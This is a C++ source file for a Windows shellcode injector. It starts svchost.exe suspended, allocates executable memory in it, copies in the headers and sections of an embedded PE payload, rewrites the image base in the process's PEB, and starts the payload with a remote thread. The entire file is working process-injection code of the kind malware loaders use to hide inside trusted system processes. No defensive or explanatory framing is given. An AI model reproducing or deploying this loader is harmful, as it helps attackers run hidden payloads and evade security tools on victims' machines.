#include <iostream>
#include <Windows.h>
#include <string>

#include "header/shellcode.h"
#include "header/logger.h"

constexpr auto TARGET_PROCESS_PATH = "C:\\Windows\\System32\\svchost.exe";

bool InjectShellcode() {
    Logger::Init("Logger", FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY,
        FOREGROUND_GREEN | FOREGROUND_BLUE,
        FOREGROUND_GREEN | FOREGROUND_INTENSITY,
        FOREGROUND_RED,
        FOREGROUND_RED | FOREGROUND_GREEN
    );

    PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(shellcode);
    PIMAGE_NT_HEADERS64 ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS64>(shellcode + dosHeader->e_lfanew);

    PROCESS_INFORMATION pi{};
    STARTUPINFO si{ sizeof(si) };
    PROCESS_BASIC_INFORMATION pbi{};

    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) {
        LOG_ERROR("Failed to load ntdll.dll");
        return false;
    }

    auto NtQueryInformationProcess = reinterpret_cast<NTQUERYINFOPROC64>(
        GetProcAddress(ntdll, "NtQueryInformationProcess"));
    if (!NtQueryInformationProcess) {
        LOG_ERROR("Failed to get NtQueryInformationProcess function address");
        FreeLibrary(ntdll);
        return false;
    }

    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        LOG_ERROR("Signature mismatch");
        FreeLibrary(ntdll);
        return false;
    }

    if (!CreateProcess(TARGET_PROCESS_PATH, nullptr, nullptr, nullptr, FALSE,
        CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        LOG_ERROR("CreateProcess failed: %lu", GetLastError());
        FreeLibrary(ntdll);
        return false;
    }

    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr);

    void* newImgBase = VirtualAllocEx(pi.hProcess, nullptr, ntHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newImgBase) {
        LOG_ERROR("VirtualAllocEx failed: %lu", GetLastError());
        CloseHandle(pi.hProcess);
        FreeLibrary(ntdll);
        return false;
    }

    if (!WriteProcessMemory(pi.hProcess, newImgBase, shellcode, ntHeader->OptionalHeader.SizeOfHeaders, nullptr)) {
        LOG_ERROR("WriteProcessMemory for headers failed: %lu", GetLastError());
        VirtualFreeEx(pi.hProcess, newImgBase, 0, MEM_RELEASE);
        CloseHandle(pi.hProcess);
        FreeLibrary(ntdll);
        return false;
    }

    PIMAGE_SECTION_HEADER sectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(
        shellcode + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));

    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; ++i) {
        void* sectionData = reinterpret_cast<void*>(reinterpret_cast<DWORD64>(shellcode) + sectionHeader->PointerToRawData);
        void* sectionBase = reinterpret_cast<void*>(reinterpret_cast<DWORD64>(newImgBase) + sectionHeader->VirtualAddress);

        if (!WriteProcessMemory(pi.hProcess, sectionBase, sectionData, sectionHeader->SizeOfRawData, nullptr)) {
            LOG_ERROR("Failed to write section %d: %lu", i, GetLastError());
        }
        ++sectionHeader;
    }

    if (!WriteProcessMemory(pi.hProcess, reinterpret_cast<void*>(reinterpret_cast<DWORD64>(pbi.PebBaseAddress) + 0x10),
        &newImgBase, sizeof(newImgBase), nullptr)) {
        LOG_ERROR("Failed to write ImgBaseAddress: %lu", GetLastError());
        VirtualFreeEx(pi.hProcess, newImgBase, 0, MEM_RELEASE);
        CloseHandle(pi.hProcess);
        FreeLibrary(ntdll);
        return false;
    }

    HANDLE newThread = CreateRemoteThread(pi.hProcess, nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(reinterpret_cast<DWORD64>(newImgBase) + ntHeader->OptionalHeader.AddressOfEntryPoint),
        nullptr, CREATE_SUSPENDED, nullptr);

    if (!newThread) {
        LOG_ERROR("Failed to create remote thread: %lu", GetLastError());
        VirtualFreeEx(pi.hProcess, newImgBase, 0, MEM_RELEASE);
        CloseHandle(pi.hProcess);
        FreeLibrary(ntdll);
        return false;
    }

    ResumeThread(newThread);
    LOG_SUCCESS("Shellcode injected successfully");

    CloseHandle(newThread);
    CloseHandle(pi.hProcess);
    FreeLibrary(ntdll);

    return true;
}

int main() {
    if (!InjectShellcode()) {
        LOG_ERROR("Injection failed");
        return 1;
    }

    std::cin.get();
    return 0;
}